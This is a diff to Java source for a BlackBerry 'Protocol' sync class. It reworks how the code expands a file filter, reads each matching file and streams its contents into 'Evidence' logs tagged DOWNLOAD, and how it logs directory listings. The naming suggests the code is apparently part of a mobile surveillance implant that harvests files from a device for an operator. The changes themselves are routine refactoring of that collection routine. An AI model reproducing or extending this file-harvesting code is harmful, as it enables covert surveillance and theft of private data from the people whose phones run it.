@@ -9,6 +9,11 @@
 
 package blackberry.action.sync;
 
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.EOFException;
+import java.io.IOException;
+import java.io.InputStream;
 import java.util.Date;
 import java.util.Enumeration;
 import java.util.Vector;
@@ -304,7 +309,8 @@ public abstract class Protocol {
         return true;
     }
 
-    public static void saveDownloadLog(String filefilter) {
+    public static void saveDownloadLog(String filefilter)
+            throws ProtocolException {
         AutoFile file = new AutoFile(filefilter, false);
         if (file.exists()) {
             //#ifdef DEBUG
@@ -315,21 +321,27 @@ public abstract class Protocol {
             //#ifdef DEBUG
             debug.trace("not a file, try to expand it: " + filefilter); //$NON-NLS-1$
             //#endif
-            for (Enumeration en = Directory.find(filefilter); en
-                    .hasMoreElements();) {
-                
+            Enumeration en = Directory.find(filefilter);
+            while (en.hasMoreElements()) {
+
                 String filename = (String) en.nextElement();
-                
+
                 file = new AutoFile(filename, false);
                 if (file.isDirectory()) {
                     continue;
                 }
 
-                saveFileLog(file, filename);
-
-                //#ifdef DEBUG
-                debug.trace("logging file: " + filename); //$NON-NLS-1$
-                //#endif
+                try {
+                    saveFileLog(file, filename);
+                    //#ifdef DEBUG
+                    debug.trace("logging file: " + filename); //$NON-NLS-1$
+                    //#endif
+                } catch (Exception e) {
+                    //#ifdef DEBUG
+                    debug.error(e);
+                    //#endif
+                    throw new ProtocolException();
+                }
 
             }
         }
@@ -343,11 +355,17 @@ public abstract class Protocol {
         Check.requires(!filename.endsWith("*"), "path shouldn't end with *"); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
-        byte[] content = file.read();
         byte[] additional = Protocol.logDownloadAdditional(filename);
         Evidence log = new Evidence(EvidenceType.DOWNLOAD);
+        log.createEvidence(additional);
 
-        log.atomicWriteOnce(additional, content);
+        int size = (int) file.getSize();
+        DataInputStream is = file.getInputStream();
+        log.writeEvidence(is, size);
+        //closes is
+        file.close();
+        log.close();
+
     }
 
     private static byte[] logDownloadAdditional(String filename) {
@@ -392,8 +410,8 @@ public abstract class Protocol {
         Evidence fsLog = new Evidence(EvidenceType.FILESYSTEM);
         fsLog.createEvidence();
 
-        path=path.replace('\\', '/');
-        
+        path = path.replace('\\', '/');
+
         // Expand path and create log
         if (path.equals("/")) { //$NON-NLS-1$
             //#ifdef DEBUG
@@ -410,8 +428,7 @@ public abstract class Protocol {
             if (!path.startsWith("/")) {
                 path = "/" + path;
             }
-            
-            
+
             expandPath(fsLog, path, depth);
 
         }
